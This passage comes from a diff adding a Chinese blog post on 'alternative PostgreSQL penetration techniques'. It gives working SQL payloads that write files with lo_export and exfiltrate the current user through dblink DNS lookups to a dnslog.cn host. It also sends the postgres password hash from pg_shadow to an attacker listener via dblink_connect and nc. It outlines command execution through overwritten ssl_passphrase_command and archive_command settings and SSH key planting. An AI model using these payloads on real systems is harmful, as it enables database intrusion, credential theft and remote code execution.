class="hljs-number">11141</span>,decode(encode(lo_get(<span class="hljs-number">11116</span>),<span class="hljs-string">&#x27;escape&#x27;</span>),<span class="hljs-string">&#x27;base64&#x27;</span>));<br><span class="hljs-keyword">select</span> lo_export(<span class="hljs-number">11141</span>,<span class="hljs-string">&#x27;/tmp/test.txt&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> lo_unlink(<span class="hljs-number">11141</span>);<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="PostgrelSQL带外数据"><a href="#PostgrelSQL带外数据" class="headerlink" title="PostgrelSQL带外数据"></a>PostgrelSQL带外数据</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 方式一</span><br><span class="hljs-comment">-- 开启 dblink 扩展</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">EXTENSION</span> dblink<br><br><span class="hljs-comment">-- 获取当前数据库用户名称</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> dblink(<span class="hljs-string">&#x27;host=&#x27;</span>||(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>)||<span class="hljs-string">&#x27;.djw0pg.dnslog.cn user=test dbname=test&#x27;</span>, <span class="hljs-string">&#x27;SELECT version()&#x27;</span>) <span class="hljs-keyword">RETURNS</span> (result <span class="hljs-type">TEXT</span>);<br><br><span class="hljs-comment">-- 方式二</span><br><span class="hljs-comment">-- nc 监听</span><br>nc -lvv <span class="hljs-number">4444</span><br><br><span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=x.x.x.x port=4445 user=test password=test sslmode=disable dbname=&#x27;</span>||(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename=<span class="hljs-string">&#x27;postgres&#x27;</span>)));<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="PostgrelSQL创建文件夹"><a href="#PostgrelSQL创建文件夹" class="headerlink" title="PostgrelSQL创建文件夹"></a>PostgrelSQL创建文件夹</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">利用条件<br>目标已经配置了 logging_collector=<span class="hljs-keyword">on</span>，默认配置<br><br>利用场景<br>往目标服务器写入ssh公钥需要在用户.ssh目录下，若没有该目录则需创建<br><br>步骤<br>通过前面的读写命令读取配置文件后修改再写入覆盖<br><br>重新加载配置文件<br><span class="hljs-keyword">select</span> pg_reload_conf();<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/postgrel1.png" srcset="/img/loading.gif" lazyload alt="图"></p>
+<h2 id="利用-ssl-passphrase-command-执行命令"><a href="#利用-ssl-passphrase-command-执行命令" class="headerlink" title="利用 ssl_passphrase_command 执行命令"></a>利用 ssl_passphrase_command 执行命令</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">利用条件<br>postgresql &gt; <span class="hljs-number">11</span><br><br>利用场景<br>常规的<span class="hljs-keyword">copy</span>命令无法使用的情况下<br><br>步骤<br>读取配置文件查看目标是否配置了ssl<br>如果已经配置了最好直接使用目标的ssl密钥，如果没有再自己生成<br>openssl req -<span class="hljs-built_in">new</span> -x509 -days <span class="hljs-number">365</span> -nodes -<span class="hljs-type">text</span> -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.crt -keyout <span class="hljs-keyword">server</span>.key -subj &quot;/CN=test&quot;<br>openssl rsa -aes256 -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> private_passphrase.key<br><br>生成后将证书<span class="hljs-keyword">server</span>.crt和私钥private_passphrase.key上传至目标服务器<br><br>修改覆盖配置文件<br><br>重新加载配置文件<br><span class="hljs-keyword">select</span> pg_reload_conf();<br><br>注<br>linux由于 pgsql 限制私钥文件权限必须是 <span class="hljs-number">0600</span> 才能够加载，因此私钥文件需覆盖PG_VERSION（与配置文件同目录下），覆盖后如果数据库重启会失败报错，所以需要及时将PG_VERSION文件恢复<br>windows不受限制<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/postgrel2.png" srcset="/img/loading.gif" lazyload alt="图"></p>
+<h2 id="利用-archive-command-执行命令"><a href="#利用-archive-command-执行命令" class="headerlink" title="利用 archive_command 执行命令"></a>利用 archive_command 执行命令</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs">利用条件<br>重启数据库服务<br><br>利用场景<br>其他方式都无法使用的严苛情况下，适用于全版本<br><br>步骤<br>修改覆盖配置文件<br><br>等待数据库服务重启<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/postgrel3.png" srcset="/img/loading.gif" lazyload alt="图"></p>
+<h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">udf提权<br><br>session_preload_libraries 执行命令<br><br><span class="hljs-meta prompt_">...</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">https:<span class="hljs-regexp">//</span>tttang.com/archive/<span class="hljs-number">1547</span>/<br><br>https:<span class="hljs-regexp">//</span>www.yulegeyu.com/<span class="hljs-number">2020</span>/<span class="hljs-number">11</span>/<span class="hljs-number">16</span>/Postgresql-Superuser-SQL<span class="hljs-variable">%E</span>6<span class="hljs-variable">%B</span>3<span class="hljs-variable">%A</span>8<span class="hljs-variable">%E</span>5<span class="hljs-variable">%8</span>5<span class="hljs-variable">%A5</span>-RCE<span class="hljs-variable">%E</span>4<span class="hljs-variable">%B</span>9%8B<span class="hljs-variable">%E</span>6<span class="hljs-variable">%9</span>7<span class="hljs-variable">%85</span>/<br><br>https:<span class="hljs-regexp">//</span>evi1cg.me/archives/PostgreSQL-Injection.html<br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/" class="category-chain-item">攻防实战</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/postgresql/" class="print-no-link">#postgresql</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>postgresql 另类渗透技巧</div>
+      <div>http://example.com/2023/06/06/postgresql 另类渗透技巧/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>catj</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
 
 
 
 
-<script src="/js/script.js"></script>
 
 
 
+    
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
